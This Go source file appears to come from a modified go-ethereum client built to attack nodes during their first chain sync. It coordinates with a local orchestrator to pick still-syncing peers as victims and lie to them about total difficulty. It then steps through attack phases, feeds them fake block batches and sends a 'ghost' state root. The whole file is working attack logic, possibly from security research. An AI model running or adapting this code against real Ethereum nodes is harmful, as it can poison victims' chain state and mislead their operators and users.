package bridge

import "net"
import "math/big"
import "time"
import "sync"
import "encoding/binary"
import "bytes"
import "os"
import "github.com/ethereum/go-ethereum/p2p"
import "github.com/ethereum/go-ethereum/ethdb"
import "github.com/ethereum/go-ethereum/core/types"
import "github.com/ethereum/go-ethereum/common"
import "github.com/ethereum/go-ethereum/core/state"
import "github.com/ethereum/go-ethereum/rlp"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
)
var port string
var conn net.Conn
var incoming chan []byte
var quitCh chan struct{}
var attackPhase utils.AttackPhase
var mustCheatAboutTd bool
var servedBatches []bool
var numServedBatches int
var dropped chan bool
var master bool
var victim *p2p.Peer
var victimID string
var otherMaliciousPeers []string
var mustChangeAttackChain bool
var quitLock sync.Mutex
var victimLock sync.Mutex
var fixHeadLock sync.Mutex
var rqlock sync.Mutex
var canServeLastFullBatch chan bool
var canServePivoting chan bool
var canDisconnect chan bool
var higherTd *big.Int
var bigOne = big.NewInt(1)
var avoidVictim bool			// Despite we need to only avoid connecting to the victim in
								// some moments, when this variable is set the peer will not
								// accept/dial any new p2p peer.
var lastOracleBit bool
var terminatingStateSync bool
var announcedSyncTD *big.Int
var announcedSyncHead common.Hash
var skeletonStart uint64
var fixedHead uint64
var pivot uint64
var rootAtPivot common.Hash
var prngSteps map[int]int
var rollback bool
var stateCache *state.Database
var withholdQuery uint64
var withholdACK bool
var withholding bool
var releaseCh chan struct{}
var providedSkeleton bool
var assignedRanges []bool
var completedRanges []bool
var dropAccountPacket chan bool
var ancestorFound bool
var fakeBatches chan types.Blocks
var allFakeBatchesReceived bool
var initialized bool



func SetOrchPort(p string) {
	port = p
}

func Initialize(id string) error {
	var err error

	err = createMgethDirIfMissing()
	if err != nil {
		log("Could not create local directory for mgeth")
		log("err =", err)
		return err
	}

	conn, err = net.Dial("tcp", ADDR+":"+port)
	if err != nil {
		log("Could not connect to orchestrator")
		log("err =", err)
		return err
	}

	_, err = conn.Write([]byte(id))
	if err != nil {
		log("Could not send node's ID to orchestrator")
		log("err =", err)
		conn.Close()
		return err
	}

	attackPhase = utils.StalePhase
	mustCheatAboutTd = true
	fakeBatches = make(chan types.Blocks)

	quitCh = make(chan struct{})
	incoming = make(chan []byte)
	go readLoop(conn, incoming, quitCh)
	go handleMessages()

	path, err := os.Getwd()
	if err != nil {
		log("err =", err)
		log("Could not get working directory")
		return err
	}
	err = sendMessage(msg.Cwd.SetContent([]byte(path)))
	if err != nil {
		log("err =", err)
		log("Could not send cwd to orchestrator")
		return err
	}

	log("Initialized bridge")
	initialized = true
	return nil
}

func IsInitialized() bool {
	return initialized
}

func SetMasterPeer() {
	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
		log("Not setting as master peer because in stale phase")
		return
	}

	err := sendMessage(msg.MasterPeer)
	if err != nil {
		fatal(err, "Could not announce self as master peer")
	}
	log("Announced as master peer")
}

func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
	vID := v.ID().String()[:8]
	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
		log("Ignoring victim", vID, "due to attack in stale phase")
		return
	}

	// Don't pick another malicious peer as a victim!
	for _, s := range otherMaliciousPeers {
		if vID == s {
			return
		}
	}

	// Victim must have to sync yet
	threshold := getTdByNumber(utils.TrueChain, 10000)
	if td.Cmp(threshold) > 0 {
		return
	}

	victimLock.Lock()
	// We want either to pick a new victim or get the p2p.Peer object of the one already picked.
	// But we must avoid changing victim during the attack.
	if victim == nil && (victimID == "" || victimID == vID) {
		victim = v
		victimID = vID
		err := sendMessage(msg.SetVictim.SetContent([]byte(victimID)))
		if err != nil {
			Close()
			fatal(err, "Could not announce victim ID to orchestrator")
		}
		if attackPhase == utils.ReadyPhase {
			attackPhase = utils.SyncPhase
			err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
			if err != nil {
				Close()
				fatal(err, "Could not announce new phase to orchestrator")
			}
		} else {
			fatal(utils.StateError, "Victim should not be set in", attackPhase, "phase")
		}

		var head *types.Header
		fixHeadLock.Lock()
		if fixedHead == 0 {
		head = latest(utils.TrueChain)
		fixedHead = head.Number.Uint64()
		r := head.Root
		err = (*stateCache).TrieDB().Commit(r, true, nil)
		if err != nil {
			fatal(err, "Cannot commit root at fixedHead,", "fixedHead =", fixedHead, "root =", r)
		}
		log("Committed trie root, fixedHead =", fixedHead, ", root =", r)
		} else {
			head = getHeaderByNumber(utils.TrueChain, fixedHead)
		}
		fixHeadLock.Unlock()

		headRlp, err := rlp.EncodeToBytes(head)
		if err != nil {
			fatal(err, "Couldn't RLP-encode header")
		}
		err = sendMessage(msg.OriginalHead.SetContent(headRlp))
		if err != nil {
			fatal(err, "Couldn't send original head to orchestrator")
		}

		go SendGhostRoot(fixedHead)

		log("Set victim:", vID)

		ancestorFound = false
	} else {
		log("Ignoring victim: vID =", vID, ", victimID =", victimID, "victim =", victim, "&victim =", &victim)
	}
	victimLock.Unlock()
}

func NewPeerJoined(peer *p2p.Peer) {
	// We don't need the victim's peer object during prediction phase
	if attackPhase != utils.SyncPhase {
		return
	}

	if peer.ID().String()[:8] == victimID {
		victim = peer
	}
	return
}


func GetAttackPhase() utils.AttackPhase {
	return attackPhase
}

func DoingSync() bool {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not determine attack phase")
		return false
		
	default:
		return (attackPhase==utils.SyncPhase)
	}
}

func DoingDelivery() bool {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not determine attack phase")
		return false
		
	default:
		return (attackPhase==utils.DeliveryPhase)
	}
}

func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
	select {
	case <-quitCh:
		fatal(utils.BridgeClosedErr, "Could not serve", chainType, "chain")
		return nil
		
	default:
		db, err := getChainDatabase(chainType)
		if err != nil {
			fatal(err, "Could not serve", chainType, "chain")
		}
		return db
	}
}

func SetTrueChain(db ethdb.Database, stateCacheBc *state.Database) {
	setChainDatabase(db, utils.TrueChain)
	stateCache = stateCacheBc
}

func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash, error) {
	select {
	case <-quitCh:
		return nil, false, nil, utils.BridgeClosedErr
		
	default:
		//Don't do anything if we are not ready yet
		if attackPhase==utils.StalePhase {
			return nil, false, nil, nil
		}

		// Don't cheat to other malicious peers!
		if IsMalicious(peerID) {
			log("Not cheating about TD to peer", peerID)
			return nil, false, nil, nil
		}

		// If the victim is not set yet, cheat only if it is a syncing node. We simply take nodes with low TD
		// in their database, meaning they have not finished their first sync yet.
		threshold := getTdByNumber(utils.TrueChain, 10000)
		if peerTD.Cmp(threshold) > 0 {
			return nil, false, nil, nil
		}
		var head *types.Header
		fixHeadLock.Lock()
		if fixedHead == 0 {
			head = latest(utils.TrueChain)
			fixedHead = head.Number.Uint64()
			r := head.Root
			err := (*stateCache).TrieDB().Commit(r, true, nil)
			if err != nil {
				fatal(err, "Cannot commit root at fixedHead,", "fixedHead =", fixedHead, "root =", r)
			}
			log("Committed trie root, fixedHead =", fixedHead, ", root =", r)
		} else {
			head = getHeaderByNumber(utils.TrueChain, fixedHead)
		}
		fixHeadLock.Unlock()
		supplement := head.Difficulty
		supplement.Mul(supplement, big.NewInt(2))
		td := new(big.Int).Add(getTd(utils.TrueChain), supplement)
					log("True TD in database (+suppl.):", td)
		log("Cheating to peer", peerID, "if necessary at this point")
		headHash := getHashByNumber(utils.TrueChain, fixedHead)

		log("Head.Number =", head.Number.Uint64(), "Head.Hash =", headHash)
		log("Nonce =", head.Nonce.Uint64(), "ParentHash =", head.ParentHash)
		return td, mustCheatAboutTd, &headHash, nil
	}
}

func Latest(chainTypeArg ...utils.ChainType) *types.Header {
	chainType := attackPhase.ToChainType()

	if chainType == utils.InvalidChainType {
		/*
		fatal(utils.ParameterErr, "Trying to get latest block while attack is stale")
		return nil
		*/
		log("Latest() returning latest block of", utils.TrueChain, "chain even if we are in", attackPhase)
		chainType = utils.TrueChain
	}
	return latest(chainType)
}

func Genesis() *types.Header {
	chainType := attackPhase.ToChainType()
	if chainType == utils.InvalidChainType {
		log("Genesis() returning genesis block of", utils.TrueChain, "chain even if we are in", attackPhase)
		chainType = utils.TrueChain
	}
	return genesis(chainType)
}


func IsVictim(id string) bool {
	return victimID==id
}

func IsMaster() bool {
	return master
}

func DelayBeforeServingBatch() {
	time.Sleep(3*time.Second)
}

func MiniDelayBeforeServingBatch() {
	time.Sleep(3000*time.Millisecond)
}


func FixedHead() uint64 {
	return fixedHead
}


func SendGhostRoot(h uint64) {
	for (latest(utils.TrueChain).Number.Uint64() <= h) {
		time.Sleep(100*time.Millisecond)
	}
	ghostRoot := getHeaderByNumber(utils.TrueChain, h+1).Root
	err := sendMessage(msg.GhostRoot.SetContent(ghostRoot.Bytes()))
	if err != nil {
		fatal(err, "Couldn't send stateRoot for SNaP-Ghost to orchestrator")
	}
}

func MustIgnoreBlock(number uint64) bool {
	if fixedHead != 0 && number > fixedHead+1 { 	// +1 to know stateRoot of following block for Ghost-ing
		return true
	}
	return false
}

func FakeBatchesToImport() chan types.Blocks {
	return fakeBatches
}

func IsLastFakeBlock(number uint64) bool {
	return number==(fixedHead+128)
}

func EndOfAttack() {
	err := sendMessage(msg.EndOfAttack)
	if err != nil {
		log("Could not notify end of attack to orchestrator, err =", err)
	}
	Close()
}

func Close() {
	quitLock.Lock()
	select {
	case <-quitCh:
	default:
		close(quitCh)
		close(incoming)
		conn.Close()
	}
	quitLock.Unlock()
}

func GetQuitCh() chan struct{} {
	return quitCh
}


func addMaliciousPeer(peer string) {
	for _, s := range otherMaliciousPeers {
		if s == peer {
			return
		}
	}
	
	log("New malicious peer:", peer)
	otherMaliciousPeers = append(otherMaliciousPeers, peer)
}

func IsMalicious(peer string) bool {
	for _, s := range otherMaliciousPeers {
		if peer == s {
			return true
		}
	}
	return false
}


func handleMessages() {
	for {
		select {
		case <-quitCh:
			log("Stopping message handler")
			return

		case messageAsBytes := <-incoming:
			message := msg.Decode(messageAsBytes)
			switch message.Code {
			case msg.NextPhase.Code:
				attackPhase += 1
				// What about setting mustChangeAttackChain here?
				// For now msg.NextPhase is never used, so we don't care.
			case msg.SetCheatAboutTd.Code:
				switch message.Content[0] {
				case 0:
					mustCheatAboutTd = false
				case 1:
					mustCheatAboutTd = true
				}
			case msg.SetVictim.Code:
				log("Set victim msg received, phase =", attackPhase)
				victimLock.Lock()
				victimID = string(message.Content)
				victimLock.Unlock()
			case msg.NewMaliciousPeer.Code:
				addMaliciousPeer(string(message.Content))
			case msg.SetAttackPhase.Code:
				newAttackPhase := utils.AttackPhase(message.Content[0])
				if newAttackPhase != attackPhase {
					attackPhase = newAttackPhase
					log("Attack phase switched to", attackPhase)
				}
			case msg.GetCwd.Code:
				path, err := os.Getwd()
				if err != nil {
					fatal(err, "Could not find current working directory")
				}
				err = sendMessage(msg.Cwd.SetContent([]byte(path)))
				if err != nil {
					fatal(err, "Could not send current working directory")
				}
			case msg.FakeBatch.Code:
				if message.Content == nil || len(message.Content) == 0 {
					log("All fake batches received")
					allFakeBatchesReceived = true
					fakeBatches <- nil
					if attackPhase != utils.DeliveryPhase {
						attackPhase = utils.DeliveryPhase
						log("Switched to", attackPhase, "phase")
						err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
						if err != nil {
							fatal(err, "Could not announce new phase to orchestrator")
						}
					}
				} else {
					log("Fake batch arrived")
					numBlocks := binary.BigEndian.Uint32(message.Content[:4])
					blocks := make(types.Blocks, numBlocks)
					size := uint64(len(message.Content)-4)
					s := rlp.NewStream(bytes.NewReader(message.Content[4:]), size)
					if err := s.Decode(&blocks); err != nil {
						fatal(err, "Couldn't RLP-decode fake batch into types.Blocks")
					}
					fakeBatches <- blocks
				}
			case msg.Terminate.Code:
				Close()
			}
		}
	}
}

func sendMessage(message *msg.Message) error {
	buf := message.Encode()
	n, err := conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

